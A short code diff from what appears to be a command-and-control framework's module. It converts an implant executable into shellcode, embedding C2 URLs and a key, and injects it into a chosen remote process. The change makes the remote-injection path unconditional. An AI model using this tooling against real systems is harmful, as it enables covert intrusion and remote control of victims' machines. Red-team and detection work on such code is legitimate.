@@ -51,11 +51,11 @@ class STModule(Module):
 
             donut_shellcode = donut.create(file='./core/teamserver/data/naga.exe', params=f"{guid};{psk};{c2_urls}", arch=2 if self.options['Architecture']['Value'] == 'x64' else 1)
             shellcode = shellcode_to_int_byte_array(donut_shellcode)
-            if self.options['InjectionMethod']['Value'] == 'InjectRemote':
-                with open('core/teamserver/modules/boo/src/injectremote.boo', 'r') as module_src:
-                    src = module_src.read()
-                    src = src.replace('BYTES', shellcode)
-                    src = src.replace('PROCESS', self.options['Process']['Value'])
-                    return src
+            #if self.options['InjectionMethod']['Value'] == 'InjectRemote':
+            with open('core/teamserver/modules/boo/src/injectremote.boo', 'r') as module_src:
+                src = module_src.read()
+                src = src.replace('BYTES', shellcode)
+                src = src.replace('PROCESS', self.options['Process']['Value'])
+                return src
         else:
             print_bad(f"Listener '{self.options['Listener']['Value']}' not found!")
